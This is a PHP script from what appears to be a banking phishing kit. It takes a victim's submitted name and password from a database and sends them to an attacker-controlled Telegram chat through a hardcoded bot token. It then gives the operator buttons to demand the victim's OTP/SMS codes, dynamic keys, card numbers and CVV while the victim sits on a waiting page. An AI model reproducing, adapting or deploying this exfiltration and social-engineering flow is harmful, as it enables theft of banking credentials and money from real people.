<?php
require 'conexion.php';

$codigo = $_POST['codigo'];
$request_id = $_POST['rid']; // Obtener el request_id enviado desde el formulario

// Buscar datos en la base de datos usando el request_id
$stmt = $pdo->prepare("SELECT nombre, telefono FROM solicitudes WHERE request_id = ?");
$stmt->execute([$request_id]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);

// Verificar si se encontró la solicitud
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$nombre = $data['nombre'];
$telefono = $data['telefono'];

// Telegram
$token = "7617726809:AAHd16JUqx-m01rHFilp6BcOsCp4iXD1L-U";
$chat_id = "-4801629674";



$mensaje = "📥 Logo recibido:\n";
$mensaje .= "👤 Usuario: $nombre\n";
$mensaje .= "🔓 Contraseña: $telefono\n";




$botones = [
  'inline_keyboard' => [[
    ['text' => "🟢DINAMICA", 'callback_data' => "OPCION_1_$request_id"],
    ['text' => "🟢OTP/SMS", 'callback_data' => "OPCION_2_$request_id"]
  ], [
    ['text' => "🔴WHATSAPP", 'callback_data' => "OPCION_3_$request_id"],
    ['text' => "🟢PERSONALES", 'callback_data' => "OPCION_4_$request_id"]
  ], [
    ['text' => "🟢CREDITO ", 'callback_data' => "OPCION_5_$request_id"],
    ['text' => "🟢DEBITO", 'callback_data' => "OPCION_6_$request_id"]
  ], [
    ['text' => "🔴ERROR USUARIO ", 'callback_data' => "OPCION_7_$request_id"],
    ['text' => "🔴ERROR DINÁMICA", 'callback_data' => "OPCION_9_$request_id"],
    ['text' => "🟢CVV",            'callback_data' => "OPCION_55_$request_id"]
  ],
  [ ['text' => "🟢FINALIZAR", 'callback_data' => "OPCION_10_$request_id"]
  ]
]];


file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
  'chat_id' => $chat_id,
  'text' => $mensaje,
  'reply_markup' => json_encode($botones)
]));

$_SESSION['nombre'] = $nombre;
$_SESSION['telefono'] = $telefono;
$_SESSION['request_id'] = $request_id;


// Redirige a pantalla de espera
header("Location: espera.html?rid=$request_id");
exit;
